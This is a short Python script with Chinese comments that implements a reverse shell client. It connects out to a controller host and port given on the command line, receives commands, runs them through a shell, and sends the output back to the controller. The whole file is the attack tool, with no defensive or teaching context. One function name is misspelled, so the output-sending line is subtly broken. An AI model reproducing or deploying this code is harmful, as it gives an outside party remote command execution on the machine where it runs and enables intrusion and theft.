#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import subprocess
import argparse
import sys
import time
import threading


def connectHost(ht, pt):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	#创建socket对象
	sock.connect((ht, int(pt)))					#主机的指定端口
	while True:
		data = sock.recv(1024)					#接收命令
		data = data.decode('utf-8')				#对命令解码
		#执行命令
		comRst = subprocess.Popen(data, shell=True,  stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		#获取命令执行结果
		m_stdout, m_stderr = comRst.communicate()
		#将执行命令结果编码后发送给client
		sock.send(m_stdout.decode(sys.getfilessystemencoding()).encode('utf-8'))

		time.sleep(1)
	sock.close()


def main():
	parser = argparse.ArgumentParser()			#命令行参数解析对象
	parser.add_argument('-H', dest='hostName', help='Host Name')
	parser.add_argument('-P', dest="conPort", help='Host,Port')

	args = parser.parse_args()			#解析命令行参数
	host =  args.hostName
	port = args.conPort

	if host == None and port == None:
		print(parser.parse_args(['-h']))
		exit(0)

	connectHost(host, port)				#连接到控制端


if __name__ == '__main__':
	main()
